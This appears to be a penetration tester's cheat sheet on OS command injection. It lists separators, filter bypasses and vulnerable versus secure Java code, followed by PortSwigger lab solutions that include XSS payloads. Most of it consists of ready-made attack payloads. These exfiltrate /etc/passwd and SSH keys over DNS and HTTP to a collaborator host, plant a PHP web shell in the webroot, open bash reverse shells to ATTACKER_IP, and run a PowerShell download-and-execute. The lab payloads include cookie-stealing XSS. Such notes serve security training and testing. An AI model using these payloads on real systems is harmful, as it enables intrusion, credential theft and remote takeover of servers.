tactic: Initial Access

**Command Injection** is when user-controlled input is passed to a system shell without sanitization, allowing an attacker to execute arbitrary OS commands in the context of the server. Even a single unsanitized parameter can lead to full server compromise.


```
Intended:   ping -c 1 user_input   →   ping -c 1 8.8.8.8
Injected:   ping -c 1 user_input   →   ping -c 1 8.8.8.8; cat /etc/passwd
```
The shell interprets the injected separator and executes the second command with the same privileges as the web application process.


## Injection Separators

```
;          command separator — run second command regardless
&&         AND — run second command only if first succeeds
||         OR — run second command only if first fails
|          pipe — send output of first as input to second
`cmd`      backtick substitution — execute and substitute output
$(cmd)     dollar substitution — execute and substitute output
>          redirect output to file
<          read input from file
&          run in background
%0a        URL-encoded newline — acts as command separator
\n         newline separator
```

---

## Injection Points

- Any parameter passed to OS commands (ping, dig, nslookup, curl, wget, whois, file conversion tools)
- File name and file path parameters
- Email fields in contact/feedback forms passed to `mail` or `sendmail`
- Image processing, video conversion, document conversion endpoints
- DNS lookup, IP check, port scanner features
- `address`, `hostname`, `domain`, `ip`, `url` parameters
- XML body fields passed to shell commands server-side
- HTTP headers used in shell scripts (`User-Agent`, `Referer`, `X-Forwarded-For`)

---

## Checklist

### Detection — Visible Output

- [ ]  Inject a command and check if output is reflected:

```
	; whoami
	& whoami
	| whoami
	`whoami`
	$(whoami)
```

- [ ]  Try URL-encoded separators if raw chars are filtered:

```
	%3b whoami       ← ;
	%26 whoami       ← &
	%7c whoami       ← |
	%60whoami%60     ← `whoami`
	%0a whoami       ← newline
```

### Detection — Blind (Time-Based)

- [ ]  Use `sleep` to confirm injection without output:

```
	; sleep 10
	& sleep 10
	|| sleep 10
	| sleep 10
	`sleep 10`
	$(sleep 10)
```

```
Windows:
```

```
	& ping -n 10 127.0.0.1 &
```

- [ ]  If response is delayed by ~10 seconds → blind command injection confirmed

### Detection — Blind (Out-of-Band)

- [ ]  Trigger a DNS lookup to Collaborator to confirm injection without response or delay:

```
	||nslookup OASTIFY.COM||
	||nslookup+OASTIFY.COM+||
	; nslookup OASTIFY.COM ;
	`nslookup OASTIFY.COM`
	$(nslookup OASTIFY.COM)
```

- [ ]  Exfiltrate data via DNS:

```
	||nslookup+$(whoami).OASTIFY.COM||
	; nslookup $(cat /etc/hostname).OASTIFY.COM ;
	`nslookup $(cat /etc/passwd | head -1 | base64).OASTIFY.COM`
```

- [ ]  Exfiltrate via HTTP to Collaborator:

```
	; curl http://OASTIFY.COM/$(whoami) ;
	$(curl http://OASTIFY.COM?data=$(cat /etc/passwd | base64 -w 0))
	||curl+http://OASTIFY.COM/+||
```

### Blind — Write Output to Readable File

- [ ]  Write command output to a file accessible via the web root:

```
	; whoami > /var/www/html/output.txt ;
	& id > /var/www/static/out.txt &
```

```
Then fetch: `GET /output.txt`
```

### XML Context Injection

- [ ]  When injecting into XML body fields, inject after closing the tag:

xml

```xml
	<address>00000 ; nslookup OASTIFY.COM ;</address>
	<hostname>server ; whoami > /var/www/html/out.txt ;</hostname>
```

### Filter Bypass

- [ ]  Use different separators if one is blocked — try all from the list above
- [ ]  Use URL encoding for special chars
- [ ]  Insert quotes or spaces to confuse simple filters:

```
	;wh''oami
	;who$@ami
```

- [ ]  Use `$IFS` as a space substitute on Linux:

```
	;cat${IFS}/etc/passwd
	;ls${IFS}-la
```

- [ ]  Use brace expansion:

```
	{cat,/etc/passwd}
```

- [ ]  Combine techniques:

```
	$'\x3bcat\x20/etc/passwd'
```

---

## Attack Payloads

**Blind OOB detection:**

```
||nslookup+OASTIFY.COM+||
```

**Data exfil via DNS:**

```
||nslookup+`whoami`.OASTIFY.COM+||
; curl http://OASTIFY.COM?c=$(cat /etc/passwd | base64 -w 0) ;
```

**Blind via sleep:**

```
; sleep 10 ;
& ping -c 10 127.0.0.1 &
```

**Write shell to webroot:**

```
; echo '<?php system($_GET[0]); ?>' > /var/www/html/shell.php ;
```

**Read sensitive files:**

```
; cat /etc/passwd ;
; cat /home/carlos/secret ;
; cat ~/.ssh/id_rsa ;
```

**Reverse shell:**

```
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 ;
; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' ;
$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')
```

**Windows:**

```
& whoami &
& ping -n 10 127.0.0.1 &
& dir C:\ &
& type C:\Windows\win.ini &
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')" &
```

---

## White Box Testing

**Vulnerable, user input concatenated directly into shell command:**

```java
@GetMapping("/network/ping")
public ResponseEntity<String> ping(@RequestParam String host) throws Exception {
    // host is user-controlled — attacker injects ; whoami or $(curl OASTIFY.COM)
    String command = "ping -c 1 " + host;
    Process process = Runtime.getRuntime().exec(command);

    String output = new BufferedReader(new InputStreamReader(process.getInputStream()))
        .lines().collect(Collectors.joining("\n"));
    return ResponseEntity.ok(output);
}
```

**Vulnerable, ProcessBuilder with shell interpretation enabled:**

```java
@PostMapping("/convert")
public ResponseEntity<byte[]> convertFile(@RequestParam String filename) throws Exception {
    // passing command through shell — /bin/sh -c interprets separators
    ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", "convert " + filename + " output.pdf");
    Process process = pb.start();
    // attacker sends filename=image.jpg;curl+http://OASTIFY.COM?c=$(cat+/etc/passwd)
}
```

**Vulnerable, email field passed to sendmail via shell:**

```java
@PostMapping("/contact")
public ResponseEntity<?> contact(@RequestParam String email,
                                  @RequestParam String message) throws Exception {
    // email injected into shell command
    String cmd = "sendmail -t " + email;
    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    return ResponseEntity.ok().build();
}
```

**Secure:**

```java
// Never pass user input to Runtime.exec() with shell interpretation
// Use ProcessBuilder with argument array — no shell, no interpretation of separators

@GetMapping("/network/ping")
public ResponseEntity<String> ping(@RequestParam String host) throws Exception {

    // validate input strictly before using it — whitelist format
    if (!host.matches("^[a-zA-Z0-9.\\-]{1,253}$")) {
        return ResponseEntity.badRequest().body("Invalid host");
    }

    // pass as separate argument — ProcessBuilder does NOT use a shell here
    // separators like ; && | are treated as literal characters, not shell operators
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
    pb.redirectErrorStream(true);
    Process process = pb.start();

    String output = new BufferedReader(new InputStreamReader(process.getInputStream()))
        .lines().collect(Collectors.joining("\n"));
    return ResponseEntity.ok(output);
}

// If OS commands are unavoidable, use a whitelist of allowed values
private static final Set<String> ALLOWED_HOSTS = Set.of("8.8.8.8", "1.1.1.1", "internal-monitor.company.com");

@GetMapping("/network/ping")
public ResponseEntity<String> safePing(@RequestParam String host) throws Exception {
    if (!ALLOWED_HOSTS.contains(host)) {
        return ResponseEntity.badRequest().body("Host not allowed");
    }
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
    // ...
}

// Prefer Java-native alternatives entirely — never shell out for what Java can do natively
// DNS lookup in Java:
InetAddress addr = InetAddress.getByName(host); // no shell needed

// File conversion in Java:
// Use Apache PDFBox, iText, ImageIO — not exec("convert ...")
```

---

## LABS

**Blind OS command injection with out-of-band interaction**
``` http

||nslookup+iugscdkgi0wod89q46pagcu5uw0nohc6.oastify.com+||
```
 
 **Reflected XSS into HTML context with all tags blocked except custom ones**
``` HTML

<            iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"          ></iframe>


```


**Reflected XSS with some SVG markup allowed**

``` http 

https://0a4a00490415d2b981b1c55e002900bc.h1-web-security-academy.net/?search=%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%3E
```


 **Reflected XSS in canonical link tag**

``` Http
`?%27accesskey=%27x%27onclick=%27alert(1)`

```


 **Reflected XSS into a JavaScript string with single quote and backslash escaped**


``` javascript

</script><img src=1 onerror=alert(document.domain)>

```

 **Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

```javascript


/?search=\';alert(1)// 
```


**Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**


``` javascript

/?search=aaaa${alert(document.domain)}
<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"></iframe>

```




 **In an XML like**

```
<address>

00000 ; nslookup https://collab;
</address>
```


## Resources

- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
- [HackTricks Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayloadsAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Reverse Shell Generator](https://www.revshells.com/)
